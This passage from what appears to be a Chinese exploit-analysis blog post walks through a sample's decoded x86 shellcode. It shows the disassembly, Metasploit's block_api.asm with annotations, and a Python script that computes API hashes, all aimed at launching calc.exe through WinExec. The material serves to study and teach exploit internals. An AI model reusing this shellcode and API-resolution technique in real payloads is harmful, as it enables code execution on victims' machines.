class="built_in">ecx</span>*<span class="number">2</span>]</span><br><span class="line">....<span class="number">0086</span>    8B58 1C         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x1C</span>]</span><br><span class="line">....<span class="number">0089</span>    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....008B    8B048B          <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]</span><br><span class="line">....008E    01D0            <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0090</span>    <span class="number">894424</span> <span class="number">24</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0x24</span>],<span class="built_in">eax</span></span><br><span class="line">....<span class="number">0094</span>    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0095</span>    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0096</span>    <span class="number">61</span>              <span class="keyword">popad</span></span><br><span class="line">....<span class="number">0097</span>    <span class="number">59</span>              <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0098</span>    5A              <span class="keyword">pop</span> <span class="built_in">edx</span></span><br><span class="line">....<span class="number">0099</span>    <span class="number">51</span>              <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">....009A  ^ FFE0            <span class="keyword">jmp</span> <span class="built_in">eax</span>                         <span class="comment">; 调用查找到的所需api函数</span></span><br><span class="line">....009C    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">....<span class="number">009D</span>    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">....009E    5A              <span class="keyword">pop</span> <span class="built_in">edx</span></span><br><span class="line">....009F    8B12            <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....00A1  ^ EB <span class="number">8D</span>           <span class="keyword">jmp</span> short ....<span class="number">0030</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....00A3    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                 <span class="comment">; ebp=0x....0021</span></span><br><span class="line">....00A4    6A <span class="number">01</span>           <span class="keyword">push</span> <span class="number">0x1</span></span><br><span class="line">....00A6    8D85 B2000000   <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xB2</span>] <span class="comment">; eax=ebp+0xB2=0x....0021+0xB2=0x....00D3(calc.exe)</span></span><br><span class="line">....00AC    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">....00AD    <span class="number">68</span> 318B6F87     <span class="keyword">push</span> <span class="number">0x876F8B31</span>         <span class="comment">; WinExec(kernel32.dll),通过hash算法算出的api_hash</span></span><br><span class="line">....00B2    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">....00B4    BB F0B5A256     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0x56A2B5F0</span>      <span class="comment">; ExitProcess(kernel32.dll)</span></span><br><span class="line">....00B9    <span class="number">68</span> A695BD9D     <span class="keyword">push</span> <span class="number">0x9DBD95A6</span>         <span class="comment">; GetVersion(kernel32.dll)</span></span><br><span class="line">....00BE    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">....00C0    3C <span class="number">06</span>           <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">0x6</span></span><br><span class="line">....00C2    7C 0A           <span class="keyword">jl</span> short ....00CE</span><br><span class="line">....00C4    80FB E0         <span class="keyword">cmp</span> <span class="built_in">bl</span>,<span class="number">0xE0</span></span><br><span class="line">....00C7    <span class="number">75</span> <span class="number">05</span>           <span class="keyword">jnz</span> short ....00CE</span><br><span class="line">....00C9    BB 4713726F     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0x6F721347</span>      <span class="comment">; RtlExitUserThread(ntdll.dll)</span></span><br><span class="line">....00CE    6A <span class="number">00</span>           <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line">....00D0    <span class="number">53</span>              <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">....00D1    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....00D3    <span class="number">6361</span> 6C         <span class="keyword">arpl</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x6C</span>],<span class="built_in">sp</span>     <span class="comment">; "calc.exe\x00"</span></span><br><span class="line">....00D6    632E            <span class="keyword">arpl</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">bp</span></span><br><span class="line">....00D8    <span class="number">65</span>:<span class="number">78</span> <span class="number">65</span>        <span class="keyword">js</span> short 03d10140</span><br><span class="line">....00<span class="built_in">DB</span>    000C0C          <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="built_in">ecx</span>],<span class="built_in">cl</span></span><br><span class="line">....00DE    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E0    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E2    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E4    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E6    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E8    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;解码完<code>shellcode</code>,然后通过<code>TEB</code>、<code>PEB</code>等结构计算出<code>WinExec()</code>函数的地址,调用<code>WinExec(&quot;calc.exe&quot;,0x1)</code>弹出计算器。计算<code>库函数API地址</code>的shellcode使用的是<code>metasploit-framework</code>中的<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="noopener">block_api.asm</a>,此版本为<code>最新版本</code>,近期<code>更新</code>过,与<code>样本</code>中的有些许差别。其<code>具体原理</code>准备重新写一篇文章,这篇就不介绍了,下面的<code>注释</code>写的已经很清楚了。其<code>功能</code>如下：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;-----------------------------------------------------------------------------;</span></span><br><span class="line"><span class="comment">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span></span><br><span class="line"><span class="comment">; Compatible: NT4 and newer</span></span><br><span class="line"><span class="comment">; Architecture: x86</span></span><br><span class="line"><span class="comment">; Size: 140 bytes</span></span><br><span class="line"><span class="comment">;-----------------------------------------------------------------------------;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; [BITS16]表示这个段是按照16位进行编译的，代码地址(比如一个label)都是16位的；[BITS32]表示编译时这个段中指令的地址都是32位的。</span></span><br><span class="line">[<span class="meta">BITS</span> <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">; Input: The hash of the API to call and all its parameters must be pushed onto stack.</span></span><br><span class="line"><span class="comment">; 输入：要调用的API的hash以及其参数都要布置在栈上。</span></span><br><span class="line"><span class="comment">; Output: The return value from the API call will be in EAX.</span></span><br><span class="line"><span class="comment">; 输出：API调用的返回值将存储在EAX中。</span></span><br><span class="line"><span class="comment">; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)</span></span><br><span class="line"><span class="comment">; Clobbers: EAX, ECX and EDX.汇编中被使用的寄存器的列表(一般的stdcall调用约定)</span></span><br><span class="line"><span class="comment">; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.</span></span><br><span class="line"><span class="comment">; Un-Clobbered: 预计EBX，ESI，EDI，ESP和EBP不会受到干扰.asm程序外使用这些寄存器,不会受到影响</span></span><br><span class="line"><span class="comment">; <span class="doctag">Note:</span> This function assumes the direction flag has allready been cleared via a CLD instruction.</span></span><br><span class="line"><span class="comment">; 注意：此函数假定方向标志(DF)已通过CLD指令清除。lodsb指令与其有关。</span></span><br><span class="line"><span class="comment">; <span class="doctag">Note:</span> This function is unable to call forwarded exports.</span></span><br><span class="line"><span class="comment">; 注意：此函数不能被转发导出</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">api_call:</span></span><br><span class="line">  <span class="keyword">pushad</span>                     <span class="comment">; 我们为调用者保留所有的寄存器,eax和ecx除外。</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span>               <span class="comment">; 创建新的栈帧</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span>               <span class="comment">; edx=0x0</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">fs</span>:<span class="built_in">edx</span>+<span class="number">0x30</span>]     <span class="comment">; 获得PEB的指针</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0xc</span>]         <span class="comment">; PEB-&gt;Ldr,_PEB_LDR_DATA结构体的指针</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0x14</span>]        <span class="comment">; 从InMemoryOrderModuleList获取第一个模块,_PEB_LDR_DATA-&gt;InMemoryOrderModuleList(_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks)</span></span><br><span class="line"><span class="symbol">next_mod:</span>                    <span class="comment">;</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">edx</span>+<span class="number">0x28</span>]        <span class="comment">; 获取modules名字的指针(unicode字符串),_LDR_DATA_TABLE_ENTRY-&gt;BaseDllName-&gt;Buffer</span></span><br><span class="line">  <span class="keyword">movzx</span> <span class="built_in">ecx</span>, <span class="built_in">word</span> [<span class="built_in">edx</span>+<span class="number">0x26</span>] <span class="comment">; 将ECX设置为我们要检查的长度,_LDR_DATA_TABLE_ENTRY-&gt;BaseDllName-&gt;MaximumLength</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edi</span>, <span class="built_in">edi</span>               <span class="comment">; 清除EDI，它将存储modules名字的hash</span></span><br><span class="line"><span class="symbol">loop_modname:</span>                <span class="comment">;</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>               <span class="comment">; 清除EAX</span></span><br><span class="line">  <span class="keyword">lodsb</span>                      <span class="comment">; 读入名称的一个字节至al,esi=esi+1(DF=0)</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">'a'</span>                <span class="comment">; 一些版本的Windows使用小写modules名字</span></span><br><span class="line">  <span class="keyword">jl</span> not_lowercase           <span class="comment">; 不是小写的情况</span></span><br><span class="line">  <span class="keyword">sub</span> <span class="built_in">al</span>, <span class="number">0x20</span>               <span class="comment">; 如果modules名字使用的是小写，则归一化为大写</span></span><br><span class="line"><span class="symbol">not_lowercase:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">ror</span> <span class="built_in">edi</span>, <span class="number">0xd</span>               <span class="comment">; 循环右移我们的hash值</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>               <span class="comment">; 加上读入的名称的当前字节</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">ecx</span>                    <span class="comment">; 长度减1</span></span><br><span class="line">  <span class="keyword">jnz</span> loop_modname           <span class="comment">; 循环,直到长度为0</span></span><br><span class="line">  <span class="comment">; 现在,我们已经计算出了modules名字的hash</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">edx</span>                   <span class="comment">; 将modules list的当前位置保存(_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks)，以备后用</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">edi</span>                   <span class="comment">; 保存当前modules的hash，以备后用</span></span><br><span class="line">  <span class="comment">; 继续迭代导出地址表</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0x10</span>]        <span class="comment">; 获得此modules基地址,_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks+0x10=_LDR_DATA_TABLE_ENTRY-&gt;DllBase</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">edx</span>+<span class="number">0x3c</span>]        <span class="comment">; 获得PE header偏移,e_flanew</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到PE header的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="number">0x78</span>]        <span class="comment">; 获得导出表(Export Directory)的RVA,_IMAGE_EXPORT_DIRECTORY结构体指针</span></span><br><span class="line">  <span class="keyword">test</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>              <span class="comment">; 测试是否不存在导出表</span></span><br><span class="line">  <span class="keyword">jz</span> get_next_mod1           <span class="comment">; 如果导出表不存在,处理下一个模块</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                   <span class="comment">; 保存当前modules导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">0x18</span>]        <span class="comment">; 获取以名称导出的函数总数,_IMAGE_EXPORT_DIRECTORY-&gt;NumberOfNames</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x20</span>]        <span class="comment">; 获取函数名表的RVA,_IMAGE_EXPORT_DIRECTORY-&gt;AddressOfNames</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到函数名表的虚拟地址</span></span><br><span class="line">  <span class="comment">; 计算模块哈希+函数哈希</span></span><br><span class="line"><span class="symbol">get_next_func:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">test</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span>              <span class="comment">; 从jecxz更改,以适应下面的随机jmp产生的较大偏移</span></span><br><span class="line">  <span class="keyword">jz</span> get_next_mod            <span class="comment">; 当我们到达Export Address Table表头的时候(向后搜索),表示遍历完成,处理下一个模块</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">ecx</span>                    <span class="comment">; 减小函数名称计数器</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]       <span class="comment">; 获得函数名称字符串的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">esi</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到函数名称字符串的虚拟地址</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edi</span>, <span class="built_in">edi</span>               <span class="comment">; 清除edi,其将用来存储函数名的hash</span></span><br><span class="line">  <span class="comment">; 将计算出的hash与我们想寻找的函数的hash进行比较</span></span><br><span class="line"><span class="symbol">loop_funcname:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>               <span class="comment">; 清除eax</span></span><br><span class="line">  <span class="keyword">lodsb</span>                      <span class="comment">; 读取函数名(ASCII字符串)的一个字节,esi=esi+1</span></span><br><span class="line">  <span class="keyword">ror</span> <span class="built_in">edi</span>, <span class="number">0xd</span>               <span class="comment">; 循环右移我们的hash值</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>               <span class="comment">; 加上从函数名中读出的当前字节</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">ah</span>                 <span class="comment">; 比较al(当前读出的函数名中的字节)和ah(null)</span></span><br><span class="line">  <span class="keyword">jne</span> loop_funcname          <span class="comment">; 如果不相等,则表示还没到达终止符,继续遍历函数名</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]           <span class="comment">; 将当前模块的hash值与函数名的hash值相加</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">0x24</span>]        <span class="comment">; 将计算出的hash与我们想寻找的函数的hash进行比较 </span></span><br><span class="line">  <span class="keyword">jnz</span> get_next_func          <span class="comment">; 如果没有找到,则继续计算下一个函数的hash</span></span><br><span class="line">  <span class="comment">; 如果找到，则修复栈，调用该函数，然后值，否则计算下一个</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">eax</span>                    <span class="comment">; 从栈上取出当前module的导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x24</span>]        <span class="comment">; 获得导出函数序号表(Export Ordinals Table)的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到导出函数序号表(Export Ordinals Table)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">cx</span>, [<span class="built_in">ebx</span>+<span class="number">2</span>*<span class="built_in">ecx</span>]        <span class="comment">; 获得所需的函数的序号</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x1c</span>]        <span class="comment">; 获得导出函数地址表(Export Address Table)的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到导出函数地址表(Export Address Table)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">4</span>*<span class="built_in">ecx</span>]       <span class="comment">; 获得所需的函数的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到所需函数的虚拟地址</span></span><br><span class="line">  <span class="comment">; 现在，我们修复栈并执行对所需函数的调用...</span></span><br><span class="line"><span class="symbol">finish:</span></span><br><span class="line">  <span class="keyword">mov</span> [<span class="built_in">esp</span>+<span class="number">0x24</span>], <span class="built_in">eax</span>        <span class="comment">; 使用所需的api地址覆盖旧的eax值,为即将到来的popad做准备</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span>                    <span class="comment">; 清除当前modules的hash</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span>                    <span class="comment">; 清除modules list的当前位置</span></span><br><span class="line">  <span class="keyword">popad</span>                      <span class="comment">; 恢复所有的调用者的寄存器,除了eax,ecx,edx外,他们在clobbered寄存器列表中</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ecx</span>                    <span class="comment">; 弹出我们的调用者存放在栈上的原始的返回地址</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edx</span>                    <span class="comment">; 弹出我们的调用者存放在栈上的所需函数的hash值</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">ecx</span>                   <span class="comment">; 将正确的返回地址放在栈上</span></span><br><span class="line">  <span class="keyword">jmp</span> <span class="built_in">eax</span>                    <span class="comment">; 跳转至寻找到的所需的api函数</span></span><br><span class="line">  <span class="comment">; 我们现在自动返回至正确的调用者所在的函数</span></span><br><span class="line"><span class="symbol">get_next_mod:</span>                <span class="comment">;</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">eax</span>                    <span class="comment">; 弹出当前modules导出表(Export Directory)的虚拟地址</span></span><br><span class="line"><span class="symbol">get_next_mod1:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edi</span>                    <span class="comment">; 弹出当前modules的hash</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edx</span>                    <span class="comment">; 恢复modules list的当前位置</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>]             <span class="comment">; 获取下一个module,_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks-&gt;Flink</span></span><br><span class="line">  <span class="keyword">jmp</span> next_mod               <span class="comment">; 处理当前模块</span></span><br></pre></td></tr></table></figure><blockquote><p>调用<code>WinExec()</code>函数时参数如下：</p></blockquote><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0C0C0D40   041E00B4  +-<span class="keyword">CALL</span> 到 WinExec 来自 041E00B2</span><br><span class="line">0C0C0D44   041E00D3  | CmdLine = <span class="string">"calc.exe"</span></span><br><span class="line">0C0C0D48   <span class="number">00000001</span>  +-ShowState = SW_SHOWNORMAL</span><br></pre></td></tr></table></figure><blockquote><p><code>shellcode</code>中计算<code>api函数hash</code>的算法如下(<code>dll名称</code>使用的是<code>大写字母</code>的<code>unicode</code>字符串)：</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">dll_name = <span class="string">"KERNEL32.DLL\x00"</span></span><br><span class="line"><span class="comment"># dll_name = "NTDLL.DLL\x00"</span></span><br><span class="line">func_name = <span class="string">"WinExec\x00"</span></span><br><span class="line"><span class="comment"># func_name = "ExitProcess\x00"</span></span><br><span class="line"><span class="comment"># func_name = "RtlExitUserThread\x00"</span></span><br><span class="line"></span><br><span class="line">bit = <span class="number">32</span> <span class="comment"># Hash位数</span></span><br><span class="line">K = <span class="number">0xD</span> <span class="comment"># 移位数</span></span><br><span class="line">dll_name_hash = <span class="number">0</span></span><br><span class="line">func_name_hash = <span class="number">0</span></span><br><span class="line">api_hash = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_right</span> <span class="params">(int_value,k,bit)</span>:</span> </span><br><span class="line">    format_string = <span class="string">'&#123;:0%db&#125;'</span> % bit </span><br><span class="line">    bin_value = format_string.format(int_value) <span class="comment"># 32 bit binary </span></span><br><span class="line">    bin_value = bin_value[-k:] + bin_value[:-k] </span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii2unicode</span><span class="params">(ascsii_str)</span>:</span></span><br><span class="line">    unicode_str = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ascsii_str:</span><br><span class="line">        unicode_str += c</span><br><span class="line">        unicode_str += chr(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> unicode_str</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_hash</span><span class="params">(name_string)</span>:</span></span><br><span class="line">    name_hash = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> name_string:</span><br><span class="line">        name_hash = circular_shift_right(name_hash,K,bit)</span><br><span class="line">        name_hash += ord(c)</span><br><span class="line">    <span class="keyword">return</span> name_hash</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    dll_name_unicode = ascii2unicode(dll_name)</span><br><span class="line">    dll_name_hash = calc_hash(dll_name_unicode)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"dll_name_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(dll_name_hash).upper()</span><br><span class="line">    func_name_hash = calc_hash(func_name)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"func_name_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(func_name_hash).upper()</span><br><span class="line">    api_hash = dll_name_hash + func_name_hash</span><br><span class="line">    <span class="keyword">if</span> api_hash &gt; <span class="number">0xFFFFFFFF</span>:</span><br><span class="line">        api_hash = api_hash - <span class="number">0x100000000</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"api_hash:"</span> + <span class="string">"&#123;:x&#125;"</span>.format(api_hash).upper()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h3 id="0x42-Heap-Spray"><a href="#0x42-Heap-Spray" class="headerlink" title="0x42 Heap Spray"></a>0x42 Heap Spray</h3><p>&emsp;&emsp;在进行<code>Heap 